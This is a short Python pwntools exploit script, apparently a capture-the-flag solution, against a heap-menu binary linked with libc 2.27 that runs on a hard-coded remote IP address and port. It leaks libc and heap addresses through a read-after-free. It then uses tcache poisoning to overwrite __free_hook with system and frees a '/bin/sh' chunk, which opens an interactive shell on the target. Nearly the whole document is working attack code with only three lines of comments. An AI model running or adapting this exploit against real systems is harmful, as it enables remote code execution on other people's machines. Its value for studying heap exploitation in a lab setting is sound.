#!/usr/bin/env python3


#Simple tcache poison with easy read after free to read leaks
#Use after free to tamper malloc inline metadata 
#To overwrite memory hooks with system function address


from pwn import *


e = ELF("./task2_patched")
libc = ELF("./libc-2.27.so")
r = remote("40.71.72.198",1235)

def create(index,size,content):
    r.sendafter(b">>",b"1\n")
    r.sendafter(b">>",f"{index}\n")
    r.sendafter(b">>",f"{size}\n")
    r.sendafter(b">>",content)

def delete(index):
    r.sendafter(b">>",b"2\n")
    r.sendafter(b">>",f"{index}\n")

def edit(index,content):
    r.sendafter(b">>",b"3\n")
    r.sendafter(b">>",f"{index}\n")
    r.sendafter(b">>",content)

def view_libc(index):
    r.sendafter(b">>",b"4\n")
    r.sendafter(b">>",f"{index}\n")
    r.recvuntil(b"A" * 88)
    leak = u64(r.recvline().strip(b"\n").decode('latin-1').ljust(8,'\x00'))
    leak = leak + 0x7f0000000000
    libc_base = leak - libc.sym["_IO_puts"] - 418
    return libc_base

def view_heap(index):
    r.sendafter(b">>",b"4\n")
    r.sendafter(b">>",f"{index}\n")
    leak = u64(r.recvline().strip(b"\x20\n").decode('latin-1').ljust(8,'\x00'))
    heap_base = leak - 0x260
    return heap_base

create(0,120,b'A' * 88)
libc_base = view_libc(0)
log.info("The libc base is " + hex(libc_base))
create(1,120,b'B' * 88)
delete(0)
delete(1)
heap_base = view_heap(1)
log.info("The heap base is " + hex(heap_base))
payload1 = pack(libc_base + libc.sym["__free_hook"],48,'little',False)
edit(1,payload1)
payload2 = p64(libc_base + libc.sym["system"])
create(2,120,b"C" * 8)
edit(2,b"/bin/sh\00")
create(3,120,b"D" * 8)
edit(3,payload2)
delete(2)
r.interactive()

